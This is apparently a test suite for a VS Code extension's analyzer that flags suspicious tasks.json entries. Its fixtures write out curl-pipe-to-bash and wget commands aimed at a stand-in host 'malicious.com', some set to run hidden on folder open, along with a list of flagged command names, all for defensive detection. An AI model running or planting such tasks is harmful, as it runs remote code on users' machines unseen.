import * as assert from 'assert'
import * as vscode from 'vscode'
import '../../analyzers/agentsFile' // load before to resolve circular dep
import { TaskAnalyzer } from '../../analyzers/taskFile'
import { FindingType } from '../../types'

suite('TaskAnalyzer', () => {

    const fakeUri = vscode.Uri.file('/workspace/.vscode/tasks.json')
    let analyzer: TaskAnalyzer

    setup(() => {
        analyzer = new TaskAnalyzer()
    })

    suite('getFullCommand', () => {

        test('returns undefined for task without command', () => {
            const task = { label: 'test' }
            const result = TaskAnalyzer.getFullCommand(task as any)
            assert.strictEqual(result, undefined)
        })

        test('returns command when no args', () => {
            const task = { command: 'echo' }
            const result = TaskAnalyzer.getFullCommand(task as any)
            assert.strictEqual(result, 'echo')
        })

        test('combines command and string args', () => {
            const task = {
                command: 'npm',
                args: ['run', 'build']
            }
            const result = TaskAnalyzer.getFullCommand(task as any)
            assert.strictEqual(result, 'npm run build')
        })

        test('combines command with object args', () => {
            const task = {
                command: 'node',
                args: [
                    { value: 'script.js' },
                    { value: '--verbose' }
                ]
            }
            const result = TaskAnalyzer.getFullCommand(task as any)
            assert.strictEqual(result, 'node script.js --verbose')
        })

        test('handles mixed string and object args', () => {
            const task = {
                command: 'docker',
                args: [
                    'run',
                    { value: '--rm' },
                    'image:tag'
                ]
            }
            const result = TaskAnalyzer.getFullCommand(task as any)
            assert.strictEqual(result, 'docker run --rm image:tag')
        })
    })

    suite('checkFile', () => {

        test('returns empty findings for clean tasks', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [{
                    label: "build",
                    type: "shell",
                    command: "make build"  // Make is not in suspicious commands
                }]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 0)
        })

        test('detects suspicious curl command', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [{
                    label: "malicious",
                    type: "shell",
                    command: "curl",
                    args: ["-s", "http://malicious.com/script.sh", "|", "bash"]
                }]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 1)
            assert.strictEqual(findings[0].type, FindingType.Task)
            assert.ok(findings[0].name.includes("malicious"))
            assert.ok(findings[0].name.includes("suspicious command"))
            assert.ok(findings[0].detail.includes("Suspicious command"))
            assert.ok(findings[0].detail.includes("curl"))
            assert.strictEqual(findings[0].priority, 'high')
        })

        test('detects powershell command', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [{
                    label: "ps-task",
                    command: "powershell -Command Get-Process"
                }]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 1)
            assert.ok(findings[0].detail.includes("powershell"))
            assert.strictEqual(findings[0].priority, 'high')
        })

        test('detects hidden presentation with multiple hiding options', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [{
                    label: "hidden-task",
                    command: "echo hello",
                    presentation: {
                        echo: false,
                        focus: false,
                        close: true,
                        reveal: "never"
                    }
                }]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 1)
            assert.strictEqual(findings[0].type, FindingType.Task)
            assert.ok(findings[0].name.includes("hidden-task"))
            assert.ok(findings[0].name.includes("hidden output"))
            assert.ok(findings[0].detail.includes("Hidden output"))
            assert.ok(findings[0].detail.includes("suppress evidence"))
            assert.strictEqual(findings[0].priority, 'low')
        })

        test('detects task that runs on folder open', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [{
                    label: "auto-task",
                    command: "echo hello",  // Use non-suspicious command
                    runOptions: {
                        runOn: "folderOpen"
                    }
                }]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 1)
            assert.ok(findings[0].name.includes("auto-runs on open"))
            assert.ok(findings[0].detail.includes("Auto-run"))
            assert.ok(findings[0].detail.includes("executes automatically"))
            assert.strictEqual(findings[0].priority, 'low')
        })

        test('combines multiple suspicious factors for high priority', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [{
                    label: "very-suspicious",
                    command: "curl -s malicious.com | bash",
                    presentation: {
                        echo: false,
                        focus: false,
                        close: true
                    },
                    runOptions: {
                        runOn: "folderOpen"
                    }
                }]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 1)
            assert.ok(findings[0].name.includes("suspicious command"))
            assert.ok(findings[0].name.includes("hidden output"))
            assert.ok(findings[0].name.includes("auto-runs on open"))
            assert.ok(findings[0].detail.includes("Suspicious command"))
            assert.ok(findings[0].detail.includes("Hidden output"))
            assert.ok(findings[0].detail.includes("Auto-run"))
            assert.strictEqual(findings[0].priority, 'high')
        })

        test('handles task without label using command', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [{
                    command: "wget http://malicious.com/file"
                }]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 1)
            assert.ok(findings[0].name.includes("wget"))
        })

        test('handles task without label or command - no findings expected', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [{
                    type: "shell",
                    args: ["curl", "malicious.com"]  // args without command don't create full command
                }]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            // A task without a command doesn't get analyzed because getFullCommand returns undefined
            assert.strictEqual(findings.length, 0)
        })

        test('handles multiple tasks with mixed findings', async () => {
            const content = new TextEncoder().encode(JSON.stringify({
                tasks: [
                    {
                        label: "clean",
                        command: "make build"  // Use non-suspicious command
                    },
                    {
                        label: "suspicious",
                        command: "bash -c 'curl malicious.com'"
                    },
                    {
                        label: "hidden",
                        command: "echo test",
                        presentation: { echo: false, focus: false, close: true }
                    }
                ]
            }))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 2)
            const names = findings.map(f => f.name)
            assert.ok(names.some(n => n.includes("suspicious")))
            assert.ok(names.some(n => n.includes("hidden")))
        })

        test('handles missing tasks array', async () => {
            const content = new TextEncoder().encode(JSON.stringify({}))
            const findings = await analyzer.checkFile(fakeUri, content)
            assert.strictEqual(findings.length, 0)
        })

        test('detects various suspicious commands', async () => {
            const suspiciousCommands = ['wget', 'python', 'node', 'ruby', 'php', 'perl', 'base64', 'netcat']

            for (const cmd of suspiciousCommands) {
                const content = new TextEncoder().encode(JSON.stringify({
                    tasks: [{
                        label: `test-${cmd}`,
                        command: cmd
                    }]
                }))
                const findings = await analyzer.checkFile(fakeUri, content)
                assert.strictEqual(findings.length, 1, `Should detect ${cmd} as suspicious`)
                assert.ok(findings[0].detail.includes("Suspicious command"))
            }
        })
    })
})
